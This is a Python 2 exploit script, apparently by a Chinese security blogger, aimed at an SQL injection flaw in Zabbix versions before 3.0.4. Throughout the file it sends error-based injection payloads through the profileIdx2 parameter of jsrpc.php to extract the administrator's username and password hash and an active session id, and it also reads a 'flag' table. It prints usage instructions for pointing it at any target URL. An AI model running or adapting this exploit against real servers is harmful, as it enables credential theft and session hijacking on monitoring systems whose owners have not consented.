#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf-8 -*-
# Date: 2016/8/18
import urllib2
import sys, os
import re


def deteck_Sql():
    u'检查是否存在SQL注入'
    payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(url + payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            return True


def sql_Inject(sql):
    u'获取特定sql语句内容'
    payload = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
        sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
        results = result_reg.findall(response)
        if results:
            return results[0]


if __name__ == '__main__':
    # os.system(['clear', 'cls'][os.name == 'nt'])
    print '+' + '-' * 60 + '+'
    print u'\t   Python Zabbix<3.0.4 SQL注入 Exploit'
    print u'\t    Blog：http://www.waitalone.cn/'
    print u'\t\t   Code BY： 独自等待'
    print u'\t\t   Time：2016-08-18'
    print '+' + '-' * 60 + '+'
    if len(sys.argv) != 2:
        print '用法: ' + os.path.basename(sys.argv[0]) + ' Zabbix 网站地址'
        print '实例: ' + os.path.basename(sys.argv[0]) + ' http://www.waitalone.cn/'
        sys.exit()
    url = sys.argv[1]
    if url[-1] != '/': url += '/'
    passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    get_flag = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(0x3a,flag,0x3a) from  flag limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    if deteck_Sql():
        print u'Zabbix 存在SQL注入漏洞!\n'
        print u'管理员  用户名密码：%s' % sql_Inject(passwd_sql)
        print u'管理员  Session_id：%s' % sql_Inject(session_sql)
        print 'flag: %s' %sql_Inject(get_flag)
    else:
        print u'Zabbix 不存在SQL注入漏洞!\n'
